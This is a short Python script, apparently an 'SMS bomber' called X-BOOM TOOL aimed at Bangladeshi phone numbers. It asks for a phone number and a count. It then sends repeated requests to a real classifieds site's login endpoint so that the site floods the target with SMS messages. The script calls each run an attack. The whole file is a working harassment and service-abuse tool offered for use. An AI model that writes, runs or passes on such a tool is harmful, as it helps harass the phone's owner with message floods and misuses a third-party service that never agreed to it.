import requests
import os
import time

def banner():
    os.system('clear')
    print("========================================")
    print("        WELCOME TO X-BOOM TOOL          ")
    print("     Created by: mmalekislam788         ")
    print("     Status: REAL SMS SENDER ACTIVE     ")
    print("========================================")

def send_sms(target, count):
    url = "https://bikroy.com/data/is-pno-registered-login"
    params = {"phone": target}
    print(f"\n[+] Attack started on: {target}")
    for i in range(count):
        try:
            response = requests.get(url, params=params)
            if response.status_code == 200:
                print(f"[!] SMS {i+1} sent successfully!")
            else:
                print(f"[?] Failed to send SMS {i+1}")
        except:
            print(f"[-] Error occurred at SMS {i+1}")
        time.sleep(2)

def main():
    banner()
    print("\n[1] Real SMS Bomber (Bangladesh)")
    print("[2] Exit")
    choice = input("\nSelect an option: ")
    if choice == '1':
        number = input("Enter Phone Number (01xxxxxxxxx): ")
        amount_input = input("Enter SMS Amount: ")
        amount = int(amount_input)
        send_sms(number, amount)
        print("\n[+] Attack Finished!")
    else:
        print("Exiting...")

if __name__ == "__main__":
    main()

            
